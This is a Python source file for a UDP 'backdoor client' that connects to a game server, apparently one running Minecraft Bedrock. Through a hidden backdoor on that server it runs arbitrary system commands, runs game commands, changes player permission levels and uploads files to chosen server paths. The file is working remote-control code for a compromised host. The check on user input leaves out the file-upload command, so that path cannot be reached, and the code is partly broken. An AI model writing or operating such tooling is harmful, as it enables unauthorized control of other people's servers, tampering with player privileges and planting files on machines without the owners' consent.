import socket
import random
import os

def get_udp_socket(loc_port=random.randint(1024, 65535), timeout: int=1, use_ipv6: bool=False, loc_addr: str="") -> socket.socket:
    if not loc_port:
        loc_port = random.randint(1024, 65535)
    if use_ipv6:
        sockets = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    else:
        sockets = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if timeout:
        sockets.settimeout(timeout)
    sockets.bind((loc_addr, loc_port))
    return sockets

if __name__ == "__main__":
    readsize = 100
    sk = get_udp_socket(timeout=10)
    addr_str = input("Please input server ip port like 127.0.0.1 19132\n")
    addr = addr_str.split(" ")
    target = (addr[0], int(addr[1]))
    print("backdoor client. Type q to quit")
    print("scmd [cmd] - execute system command")
    print("gcmd [cmd] - execute game command")
    print("perm [player name] [level: 0~3] [0: hide | 1: display] - set player permission level")
    print("sendfile localpath remotepath - sendfile to server")
    while True:
        cmd = input(">>> ")
        if cmd == "q":
            break
        # prevent invalid user command input
        if not any(cmd.startswith(f'{x} ') for x in ['scmd', 'gcmd', 'perm']):
            continue
        if cmd.startswith("sendfile"):
            sendfilecmd = cmd.split(" ")
            filesize = os.path.getsize(sendfilecmd[1])
            sk.sendto(f"backdoor {sendfilecmd[0]} path {sendfilecmd[2]} {filesize}\0".encode(), target)
            ret_msg = sk.recvfrom(10240)[0].decode(encoding="gbk")[9:]
            print(ret_msg)
            localfile = open(sendfilecmd[1], mode='rb')
            print("sendfile", filesize)
            while localfile.tell() < filesize:
                if localfile.tell() + readsize > filesize:
                    readsizeend = filesize - localfile.tell()
                    readoutput = localfile.read(readsizeend).hex()
                    #print(readsizeend, readoutput, localfile.tell())
                    sk.sendto(f"backdoor sendfile filebin {readsizeend} {readoutput} {localfile.tell()}\0".encode(), target)
                    ret_msg = sk.recvfrom(10240)[0].decode(encoding="gbk")[9:]
                    #print(ret_msg)
                else:
                    readoutput = localfile.read(readsize).hex()
                    #print(readsize, readoutput, localfile.tell())
                    sk.sendto(f"backdoor sendfile filebin {readsize} {readoutput} {localfile.tell()}\0".encode(), target)
                    ret_msg = sk.recvfrom(10240)[0].decode(encoding="gbk")[9:]
                    #print(ret_msg)
            sk.sendto(f"backdoor sendfile fileend\0".encode(), target)
            print("?:", filesize)
        else:
            sk.sendto(f"backdoor {cmd}\0".encode(), target)
        try:
            ret_msg = sk.recvfrom(10240)[0].decode(encoding="gbk")[9:]
            print(f"{ret_msg}")
        except socket.timeout:
            pass
